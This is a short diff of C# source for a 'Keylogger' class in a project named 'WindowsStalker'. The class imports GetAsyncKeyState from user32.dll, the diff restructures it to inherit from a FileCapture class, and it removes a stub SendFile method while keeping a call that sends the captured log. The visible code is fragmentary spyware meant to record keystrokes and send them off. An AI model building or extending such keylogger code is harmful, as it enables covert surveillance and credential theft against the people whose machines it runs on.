@@ -3,10 +3,11 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
+using WindowsStalker.Properties;
 
 namespace WindowsStalker
 {
-    public class Keylogger
+    public class Keylogger : FileCapture
     {
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -30,18 +31,10 @@ namespace WindowsStalker
                 }
             }
 
-            Console.WriteLine("stream closed");
             sr.Close();
             s.Stop();
 
             SendFile("xd");
-        }
-
-        public static bool SendFile(string tmpFilePath)
-        {
-            //TODO
-            Console.WriteLine("keylog sent");
-            return true;
         }
     }
 }
